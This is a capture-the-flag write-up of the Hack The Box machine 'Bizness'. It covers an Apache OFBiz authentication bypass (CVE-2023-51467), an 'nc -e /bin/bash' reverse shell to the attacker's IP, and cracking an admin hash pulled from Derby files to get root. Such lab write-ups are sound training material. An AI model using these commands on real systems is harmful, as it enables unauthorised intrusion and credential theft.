---
title: HTB - Bizness
date: 2024-05-26 00:00:00 + 1000
categories: [CTF,HTB]
tags: [cve-2023-51467, apache ofbiz, htb]
comments: false
---
Bizness is easy rated box, I got the initial access to this machine by exploiting the Apache OFBiz Authentication Bypass vulnerability (CVE-2023-51467). Once I got the shell, I did doing some reconnaissance, I found the `derby` database. Then I extract the hash and crack the password, login as to root.

## Common Enumeration

### Nmap

Running the nmap scan - `nmap -p- -sC -sV -oA recon/allport 10.10.11.252 --open` found the four open ports as following:

- SSH (22)
- HTTP (80)
- HTTPS (443)
- tcpwrapped (37771)

```bash
$ nmap -p- -sC -sV -oA recon/allport 10.10.11.252 --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 18:35 AEST
Nmap scan report for 10.10.11.252
Host is up (0.0062s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open  ssl/http   nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
37771/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.47 seconds

```

Both port `80` and `443` redirect to `https://bizness.htb`. Which I have added to the `/etc/hosts`
### Browsing Website

The website is about delivering business solutions

![img](/assets/img/Bizness/Pastedimage20240523192307.webp)

At the bottom of the page there is a "contact us" section. but clicking on the `Send Message` button does not trigger any action

![img](/assets/img/Bizness/Pastedimage20240523192550.webp)

At the footer section there is the newsletter input box for email subscriptions and mentions that it is powered by `Apache OFBiz`

![img](/assets/img/Bizness/Pastedimage20240523193825.webp)
### Vulnerability Discovery and Proof of Concept (PoC) Testing

A quick google search for **Apache OFBiz** found a blog post by [SonicWall](https://blog.sonicwall.com/en-us/2023/12/sonicwall-discovers-critical-apache-ofbiz-zero-day-authbiz/) - detailing an authentication bypass vulnerability (CVE-2023-51467)

I have send the request to the following

```bash
/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y
```

The server responded with `PONG`, it indicates it is vulnerable.

![img](/assets/img/Bizness/Pastedimage20240523200214.webp)

### Exploiting for Remote Code Execution (RCE)

Found the repo [Apache-OFBiz-Authentication-Bypass](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) - testing the RCE with `whoami` command does not return anything back

```bash
$ python3 exploit.py --url https://bizness.htb/ --cmd 'whoami'
[+] Generating payload...
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.

```

I tested if it could reach out to my machine:
- I ran `sudo tcpdump -i tun0 icmp` 
- Send the payload `python3 exploit.py --url https://bizness.htb/ --cmd 'ping -c 3 10.10.14.31'

Received the **ICMP echo packets**, Verifying that the it can reach back.

```bash
$ sudo tcpdump -i tun0 icmp
[sudo] password for ctf: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:53:18.545011 IP bizness.htb > 10.10.14.31: ICMP echo request, id 16497, seq 1, length 64
20:53:18.545051 IP 10.10.14.31 > bizness.htb: ICMP echo reply, id 16497, seq 1, length 64
20:53:19.547226 IP bizness.htb > 10.10.14.31: ICMP echo request, id 16497, seq 2, length 64
20:53:19.547267 IP 10.10.14.31 > bizness.htb: ICMP echo reply, id 16497, seq 2, length 64
20:53:20.549253 IP bizness.htb > 10.10.14.31: ICMP echo request, id 16497, seq 3, length 64
20:53:20.549294 IP 10.10.14.31 > bizness.htb: ICMP echo reply, id 16497, seq 3, length 64

```

I send the rev shell `python3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/bash 10.10.14.31 1337'`

```bash
$ python3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/bash 10.10.14.31 1337'
[+] Generating payload...
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.

```

Got shell as the `ofbiz` user.

## Shell ofbiz

I upgraded the shell using Python3

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Got the `user.txt` flag from the `ofbiz` home directory

```bash
fbiz@bizness:~$ ls -la
total 32
drwxr-xr-x 4 ofbiz ofbiz-operator 4096 Jan  8 05:31 .
drwxr-xr-x 3 root  root           4096 Dec 21 09:15 ..
lrwxrwxrwx 1 root  root              9 Dec 16 05:21 .bash_history -> /dev/null
-rw-r--r-- 1 ofbiz ofbiz-operator  220 Dec 14 14:24 .bash_logout
-rw-r--r-- 1 ofbiz ofbiz-operator 3560 Dec 14 14:30 .bashrc
drwxr-xr-x 8 ofbiz ofbiz-operator 4096 Dec 21 09:15 .gradle
drwxr-xr-x 3 ofbiz ofbiz-operator 4096 Dec 21 09:15 .java
-rw-r--r-- 1 ofbiz ofbiz-operator  807 Dec 14 14:24 .profile
-rw-r----- 1 root  ofbiz-operator   33 May 23 04:33 user.txt
```

### Enumeration and Discovery

I have done initial reconnaissance but didn't find anything obvious, Then ran the `linpeas` enumeration script which highlighted below as a potential privilege escalation vector 

```bash
...snip...
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
You can't write on systemd PATH
```

Looking into the directory, I have noticed the `derby` an open-source [open source relational database](https://db.apache.org/derby/#:~:text=Apache%20Derby%2C%20an%20Apache%20DB,engine%20and%20embedded%20JDBC%20driver.) 

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data$ ls -la
total 20
drwxr-xr-x 3 ofbiz ofbiz-operator 4096 Dec 21 09:15 .
drwxr-xr-x 9 ofbiz ofbiz-operator 4096 Dec 21 09:15 ..
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Dec 21 09:15 derby
-rw-r--r-- 1 ofbiz ofbiz-operator 1231 Oct 13  2023 derby.properties
-rw-r--r-- 1 ofbiz ofbiz-operator   88 Oct 13  2023 README

```

The `.dat` files are located `/opt/ofbiz/runtime/data/derby/ofbiz/seg0`

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ ls -la   
total 65212                                                         
drwxr-xr-x 2 ofbiz ofbiz-operator  139264 Dec 21 09:15 .         
drwxr-xr-x 5 ofbiz ofbiz-operator    4096 May 24 04:34 ..        
-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10001.dat
-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10011.dat
-rw-r--r-- 1 ofbiz ofbiz-operator   28672 Dec 16 03:39 c1001.dat 
-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10021.dat
-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10031.dat
-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:39 c10041.dat
-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:39 c10051.dat
-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10061.dat
-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10071.dat
...snip...
```

### Extracting and Cracking the Hash

- I ran the `strings * | grep 'SHA'` command to search for SHA hashes within the database files

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ strings * | grep 'SHA'
SHA-256
MARSHALL ISLANDS
SHAREHOLDER
SHAREHOLDER
<eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```

- Found the encoded password `uP0_QaVBpDWFeo8-dRzDqRwXQ2I`
- This part took me sometime to figure out, I went to ofbiz GitHub, search the `hash` which led to to [HashCrypt.java](https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java) 
- The function takes a `hashType`, a `salt` and `bytes`

![img](/assets/img/Bizness/Pastedimage20240524205223.webp)

The another function encode to base64 using the below function

![img](/assets/img/Bizness/Pastedimage20240524205547.webp)

When I googled the `encodeBase64URLSafeString`, found that it's replaces `+` and `/` with `-` and `_` respectively

### Decoding and Cracking the Password

I converted to hex, So we can crack using the Hashcat, and `d` is the salt.

```bash
$ echo -n "uP0_QaVBpDWFeo8-dRzDqRwXQ2I" | tr '_-' '/+' | base64 -d | xxd -p
b8fd3f41a541a435857a8f3e751cc3a91c174362
```

I ran the Hashcat to crack the password

```bash
hashcat --force -m 120 b8fd3f41a541a435857a8f3e751cc3a91c174362:d /usr/share/wordlists/rockyou.txt
```

Hashcat cracked the password: `monkeybizness` 

## Privilege Escalation to Root

With the password `monkeybizness`, I can `su root` 

```bash
ofbiz@bizness:~$ su root 
Password: 
root@bizness:/home/ofbiz# whoami
root
root@bizness:/home/ofbiz# ls -la /root/
total 28
drwx------  4 root root 4096 May 24 04:33 .
drwxr-xr-x 18 root root 4096 Mar 27 11:05 ..
lrwxrwxrwx  1 root root    9 Dec 16 05:21 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  7 root root 4096 Dec 21 09:15 .gradle
drwxr-xr-x  3 root root 4096 Dec 21 09:15 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 May 24 04:33 root.txt
root@bizness:/home/ofbiz# 
```

Get the `root.txt` flag
